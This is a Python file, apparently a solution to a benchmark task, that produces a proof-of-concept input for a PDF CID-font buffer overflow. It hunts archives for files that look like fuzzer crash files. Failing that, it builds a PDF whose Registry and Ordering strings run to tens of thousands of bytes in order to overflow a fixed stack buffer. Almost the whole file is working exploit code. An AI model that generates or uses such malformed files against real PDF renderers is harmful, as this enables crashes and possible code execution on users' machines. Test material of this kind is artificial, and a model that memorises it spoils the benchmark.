import os
import io
import tarfile
import zipfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate embedded PoC in the source tarball or directory. If not found, generate a PoC.
        poc = self._find_poc_in_source(src_path, 80064)
        if poc is not None:
            return poc
        # Fallback: generate a minimal PDF that stresses CIDFont fallback using extremely long Registry/Ordering.
        return self._generate_cidfont_overflow_pdf()

    # ------------------------- Archive / Directory Scanning -------------------------

    def _find_poc_in_source(self, src_path: str, target_size: int) -> bytes | None:
        # Try tar-like archives
        if os.path.isfile(src_path):
            # Attempt tarfile
            poc = self._find_in_tar(src_path, target_size)
            if poc is not None:
                return poc
            # Attempt zipfile
            poc = self._find_in_zip(src_path, target_size)
            if poc is not None:
                return poc
            # If it's a file but not a recognized archive, no PoC inside
            return None
        # If a directory path is given
        if os.path.isdir(src_path):
            return self._find_in_dir(src_path, target_size)
        return None

    def _find_in_tar(self, tar_path: str, target_size: int) -> bytes | None:
        try:
            with tarfile.open(tar_path, mode="r:*") as tf:
                members = [m for m in tf.getmembers() if m.isreg()]
                # Select candidate(s)
                best_name = None
                best_score = None

                for m in members:
                    name = m.name
                    size = m.size
                    score = self._candidate_score(name, size, target_size)
                    if score is None:
                        continue
                    if best_score is None or score > best_score:
                        best_score = score
                        best_name = name

                if best_name is not None:
                    m = tf.getmember(best_name)
                    f = tf.extractfile(m)
                    if f is not None:
                        return f.read()
        except Exception:
            pass
        return None

    def _find_in_zip(self, zip_path: str, target_size: int) -> bytes | None:
        try:
            with zipfile.ZipFile(zip_path, "r") as zf:
                infos = [i for i in zf.infolist() if not i.is_dir()]
                best_name = None
                best_score = None
                for info in infos:
                    name = info.filename
                    size = info.file_size
                    score = self._candidate_score(name, size, target_size)
                    if score is None:
                        continue
                    if best_score is None or score > best_score:
                        best_score = score
                        best_name = name
                if best_name is not None:
                    with zf.open(best_name, "r") as f:
                        return f.read()
        except Exception:
            pass
        return None

    def _find_in_dir(self, dir_path: str, target_size: int) -> bytes | None:
        best_path = None
        best_score = None
        for root, _, files in os.walk(dir_path):
            for fn in files:
                try:
                    path = os.path.join(root, fn)
                    size = os.path.getsize(path)
                    score = self._candidate_score(path, size, target_size)
                    if score is None:
                        continue
                    if best_score is None or score > best_score:
                        best_score = score
                        best_path = path
                except Exception:
                    continue
        if best_path:
            try:
                with open(best_path, "rb") as f:
                    return f.read()
            except Exception:
                return None
        return None

    def _candidate_score(self, name: str, size: int, target_size: int) -> float | None:
        # Ignore very small files (<16 bytes)
        if size < 16:
            return None

        # Extensions likely for a CID font related PoC or PDF
        ext_weights = {
            ".pdf": 4.0,
            ".otf": 4.0,
            ".cff": 4.0,
            ".ttf": 3.5,
            ".bin": 3.0,
            ".dat": 2.0,
            ".poc": 4.0,
            ".txt": -1.0,
            ".c": -2.0,
            ".cc": -2.0,
            ".cpp": -2.0,
            ".h": -2.0,
            ".py": -2.0,
            ".java": -2.0,
            ".md": -2.0,
        }
        base_score = 0.0

        lname = name.lower()
        # Encourage probable PoC names
        keywords = [
            ("poc", 5.0),
            ("crash", 4.0),
            ("testcase", 4.0),
            ("id:", 3.5),
            ("clusterfuzz", 4.0),
            ("min", 2.0),
            ("cid", 3.0),
            ("font", 2.5),
            ("overflow", 3.5),
            ("pdf", 2.5),
            ("reg", 1.0),
            ("ordering", 1.0),
        ]
        for kw, w in keywords:
            if kw in lname:
                base_score += w

        # Extension score
        ext = ""
        idx = lname.rfind(".")
        if idx != -1:
            ext = lname[idx:]
        base_score += ext_weights.get(ext, 0.0)

        # Size proximity to target
        # Exact match strongly rewarded
        if size == target_size:
            base_score += 10.0
        else:
            # Penalize distance from target size
            # closer => higher
            dist = abs(size - target_size)
            # Avoid too much penalty for small distances
            proximity = max(0.0, 6.0 - (dist / 2048.0))
            base_score += proximity

        # De-emphasize giant source files
        # Limit huge text-like names
        if ext in (".c", ".cc", ".cpp", ".h", ".py", ".java", ".md", ".txt"):
            base_score -= 5.0

        return base_score

    # ------------------------- Fallback PoC PDF Generator -------------------------

    def _generate_cidfont_overflow_pdf(self) -> bytes:
        # Craft a minimal PDF with a Type0 font referencing a CIDFontType2 descendant
        # with a CIDSystemInfo dictionary that contains extremely long Registry and Ordering
        # strings to exercise the fallback path that constructs "<Registry>-<Ordering>".
        # Many vulnerable implementations used a fixed-size stack buffer for this string.

        # Sizes chosen to keep total file size reasonable while still stressing the overflow.
        # Combined length around ~78k bytes to approximate a large-but-manageable PoC.
        reg_len = 60000
        ord_len = 18000

        reg = b"A" * reg_len
        ord_ = b"B" * ord_len

        obj_list = []

        def add_obj(objnum: int, content: bytes):
            obj_bytes = f"{objnum} 0 obj\n".encode("ascii") + content + b"\nendobj\n"
            obj_list.append(obj_bytes)

        # 1: Catalog
        add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page
        page_dict = b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 612 792] /Contents 5 0 R >>"
        add_obj(3, page_dict)

        # 4: Type0 Font referencing descendant 6 0 R
        type0_font = b"<< /Type /Font /Subtype /Type0 /BaseFont /FAKEFONT /Encoding /Identity-H /DescendantFonts [6 0 R] >>"
        add_obj(4, type0_font)

        # 5: Content stream (simple text to force font usage)
        content_stream = b"BT /F1 12 Tf 72 720 Td (Hello) Tj ET"
        stream_obj = (
            b"<< /Length " + str(len(content_stream)).encode("ascii") + b" >>\nstream\n" + content_stream + b"\nendstream"
        )
        add_obj(5, stream_obj)

        # 6: Descendant CIDFont with huge CIDSystemInfo strings (Registry / Ordering)
        # W and DW minimal metrics; we omit embedded font data to force fallback.
        cid_system_info = b"<< /Registry (" + reg + b") /Ordering (" + ord_ + b") /Supplement 0 >>"
        cidfont = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /FAKEFONT "
            b"/CIDSystemInfo " + cid_system_info + b" "
            b"/FontDescriptor 7 0 R "
            b"/DW 1000 /W [0 [1000]] "
            b">>"
        )
        add_obj(6, cidfont)

        # 7: FontDescriptor (minimal)
        font_desc = (
            b"<< /Type /FontDescriptor /FontName /FAKEFONT /Flags 4 "
            b"/FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 0 /StemV 0 >>"
        )
        add_obj(7, font_desc)

        # Build the full PDF with xref
        header = b"%PDF-1.4\n%\xCF\xEC\x8F\xA2\n"
        body = io.BytesIO()
        offsets = [0]  # object 0 is the free object
        body.write(header)
        current_offset = body.tell()

        for obj in obj_list:
            offsets.append(current_offset)
            body.write(obj)
            current_offset += len(obj)

        # xref
        xref_offset = body.tell()
        nobj = len(obj_list)
        xref = io.BytesIO()
        xref.write(f"xref\n0 {nobj + 1}\n".encode("ascii"))
        # Free object 0
        xref.write(b"0000000000 65535 f \n")
        for off in offsets[1:]:
            xref.write(f"{off:010d} 00000 n \n".encode("ascii"))
        body.write(xref.getvalue())

        # trailer
        trailer = (
            b"trailer\n<< /Size " + str(nobj + 1).encode("ascii") + b" /Root 1 0 R >>\n"
            b"startxref\n" + str(xref_offset).encode("ascii") + b"\n%%EOF\n"
        )
        body.write(trailer)

        return body.getvalue()